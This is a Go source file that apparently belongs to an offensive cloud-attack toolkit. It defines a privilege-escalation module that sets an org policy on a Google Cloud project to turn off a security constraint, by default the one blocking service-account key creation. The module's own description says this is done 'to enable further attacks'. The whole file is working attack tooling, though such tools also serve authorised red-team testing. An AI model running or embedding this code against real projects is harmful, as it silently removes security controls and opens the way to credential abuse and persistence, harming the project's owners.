package orgpolicy

import (
	"context"
	"fmt"

	crm "google.golang.org/api/cloudresourcemanager/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&WeakenConstraints{})
}

// WeakenConstraints disables or weakens org policy constraints on a project.
type WeakenConstraints struct{}

func (m *WeakenConstraints) Info() module.Info {
	return module.Info{
		Name:         "privesc.orgpolicy.weaken-constraints",
		Tactic:       module.TacticPrivesc,
		Service:      "cloudresourcemanager",
		Description:  "Weaken or disable org policy constraints on a project to enable further attacks",
		RequiresAuth: true,
	}
}

func (m *WeakenConstraints) Run(ctx module.RunContext) error {
	constraint := ctx.Flags["constraint"]
	if constraint == "" {
		constraint = "iam.disableServiceAccountKeyCreation"
		output.Info("No --constraint specified, defaulting to: %s", constraint)
	}

	projects := module.EnsureProjects(&ctx)
	if len(projects) == 0 {
		output.Warn("No project specified.")
		return nil
	}
	project := projects[0]

	svc, err := crm.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create resource manager client: %w", err)
	}

	// Build the full constraint name if not already prefixed.
	fullConstraint := constraint
	if len(constraint) < 12 || constraint[:12] != "constraints/" {
		fullConstraint = "constraints/" + constraint
	}

	output.Info("Disabling constraint %s on project %s", fullConstraint, project)

	req := &crm.SetOrgPolicyRequest{
		Policy: &crm.OrgPolicy{
			Constraint: fullConstraint,
			BooleanPolicy: &crm.BooleanPolicy{
				Enforced: false,
			},
		},
	}

	policy, err := svc.Projects.SetOrgPolicy(project, req).Do()
	if err != nil {
		return fmt.Errorf("set org policy: %w", err)
	}

	output.Success("Org policy constraint disabled!")
	output.Info("Constraint: %s", policy.Constraint)
	output.Info("Enforced:   false")
	output.Warn("The constraint %s is now NOT enforced on project %s", constraint, project)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.orgpolicy.weaken-constraints",
			Severity:    module.SevCritical,
			Title:       "Org policy constraint disabled",
			Description: fmt.Sprintf("Disabled constraint %s on project %s, weakening security controls", fullConstraint, project),
			Resource:    project,
			Project:     project,
			Data: map[string]any{
				"constraint": fullConstraint,
				"enforced":   false,
			},
		}
	}

	return nil
}
